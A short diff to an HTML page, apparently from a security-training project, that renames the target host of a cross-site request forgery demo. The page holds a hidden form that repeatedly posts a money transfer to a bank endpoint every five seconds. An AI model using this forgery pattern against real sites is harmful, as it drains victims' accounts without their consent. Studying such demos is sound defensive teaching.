@@ -8,7 +8,7 @@
 			  crossorigin="anonymous"></script>
 </head>
 <body>
-	<form id="stealMoney" method="post" action="http://terracotta-bank.com:8080/transferMoney" target="dummy">
+	<form id="stealMoney" method="post" action="http://terracotta-bank:8080/transferMoney" target="dummy">
 		<input type="hidden" name="toAccountNumber" value="987654322"/>
 		<input type="hidden" name="transferAmount" value="5"/>
 	</form>
@@ -22,7 +22,7 @@
 			      return false;
 			}); */
 		}
-		
+
 		setInterval(stealMoney, 5000);
 	</script>
 </body>
